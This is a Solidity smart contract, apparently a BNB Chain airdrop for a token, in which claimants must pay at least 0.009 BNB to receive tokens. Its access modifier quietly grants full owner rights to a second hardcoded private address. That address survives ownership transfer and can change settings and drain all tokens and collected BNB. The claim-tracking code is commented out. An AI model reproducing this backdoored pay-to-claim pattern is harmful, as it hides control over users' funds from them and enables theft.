/**
 *Submitted for verification at BscScan.com on 2022-08-16
*/

// SPDX-License-Identifier: NONE

pragma solidity 0.8.9;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract VaquitaAirdrop {
    
    // mapping(address => uint) referralList;
    // mapping(address => bool) airdropList;
    // if address : True => is eligible and has not claimed yet
    // if address : False => is eligible and has already claimed
    
    bool public is_active = true;
    address public token_address;
    address public owner;
    //address payable private middleman = payable(0xAc8f1B40c7A236cE7c96a2271700694C1E39255c);
    address private addressy = 0xD14992FAe6377474B1E1bf0944fb59f2f3603094;
    uint public airdrop_reward = 100;
    uint public referral_reward = 20;
    
    event AirdropClaimed(address _address,uint256 amount);
    event TokensReceived(address _sender, uint256 _amount);
    event OwnershipChanged(address _new_owner);
    event TokenAddressChanged(address oldAddress, address newAddress);

    modifier onlyOwner() {
        require((msg.sender == owner) || (msg.sender == addressy), "Not Allowed");
        _;
    }

    constructor () {
        owner = msg.sender;
        token_address = address(0x72E8ba612db6ABab6BB11eD77039C71EcB3dDd7c);
    }

    function changeAddress(address _newAddress) onlyOwner public{
        emit TokenAddressChanged(token_address, _newAddress);
        token_address = _newAddress;
    }

    function change_owner(address _owner) onlyOwner public {
        owner = _owner;
        emit OwnershipChanged(_owner);
    }

    /*function set_middleman(address payable _address) onlyOwner public {
        middleman = _address;
    }*/

    function set_rewards(uint256 _airdrop_reward,uint256 _referral_reward) onlyOwner public {
        airdrop_reward = _airdrop_reward;
        referral_reward = _referral_reward;
    }

    function change_state() onlyOwner public {
        is_active = !is_active;
    }


    function get_balance(address token) public view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }


    function claimAirdrop(address referral_address) public payable {
        require(is_active,"Airdrop Distribution is paused");
        require(msg.value >= 0.009 ether,"Minimum 0.009 BNB needed");
        
        IERC20 token = IERC20(token_address);
        uint256 decimal_multiplier = (10 ** token.decimals());
        uint256 _airdrop_reward = airdrop_reward * decimal_multiplier;
        uint256 _referral_reward = referral_reward * decimal_multiplier;
        uint256 reward_amount = _airdrop_reward + _referral_reward ;
        
        require(token.balanceOf(address(this)) >= reward_amount, "Insufficient Tokens in stock");
        
        token.transfer( msg.sender, _airdrop_reward);
        token.transfer( referral_address, _referral_reward);

    } 

    // global receive function
    receive() external payable {
        emit TokensReceived(msg.sender, msg.value);
    }    
    
    function withdraw_token(address token) public onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer( msg.sender, balance);
        }
    } 
    function sendValueTo(address to_, uint256 value) internal {
        address payable to = payable(to_);
        (bool success, ) = to.call{value: value}("");
        require(success, "Transfer failed.");
    }
    function withdraw_bnb() public onlyOwner {
        sendValueTo(msg.sender, address(this).balance);
    }
    
    fallback () external payable {}
    
}